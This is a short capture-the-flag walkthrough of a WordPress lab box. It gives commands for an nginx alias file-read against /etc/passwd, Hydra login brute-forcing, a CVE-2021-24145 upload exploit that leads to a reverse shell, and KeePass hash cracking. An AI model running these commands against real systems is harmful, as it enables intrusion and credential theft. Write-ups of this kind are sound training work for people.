Started with a nmap scan
```
22 OpenSSH 8.9p1 Ubuntu
80 nginx 1.18.0
```
Started a gobuster scan `2.2-medium` 
```
/wordpress
/wordpress/images
/wordpress/index.php
/wordpress/wp-content
/wordpress/wp-login.php
/wordpress/license.txt
/wordpress/wp-includes
/wordpress/readme.html
/wordpress/wp-traceback.php
/wordpress/wp-admin
/wordpress/xmlrpc.php
```
The site has a domain with it `mountaineer.thm` 
wordpress version `6.4.3` 
Ran wpscan found some usernames
```
admin
everest
montblanc
chooyu
k2
```
Did not find any subdomains 
Its vulnerable to Alias LFI we can find this on hacktricks 
`curl http://mountaineer.thm/wordprress/imagess../etc/passwd` 
and we have LFI now looking at the config file for the nginx server we find a subdomain `adminroundcubemail.mountainner.thm` giong to the wordpress site use cewl to make a wordlist and we have used wpscan to get a list of users and we can use hydra to bruteforce logins and we got login for the roundcube `k2:k2` 
```
Possibale passwords
th3_tall3st_password_in_th3_world
```
we can send a password reset for the user `k2` and now we have access to the wordpress panel and we can use `CVE-2021-24145` have to get the full syntax right `python3 poc.py -t domain -P 80 -U /wordpress/ -u k2 -p 'password'` and now there is a poney shell uploaded we can get a reverse shell with this looking around there is alot of users we can get back to the `k2` user with the same login from roundcube and if we go to the `lhotse` user there is a keepass file I got it to my machine and we can use `keepass2john` to make it a crack able hash we now need to make a custom wordlist with the tool cupp and it cracked to `Lhotse56185` we now we have the creds for the user `kangchenjunga` and now that we are this user looking at the historey file there is the root password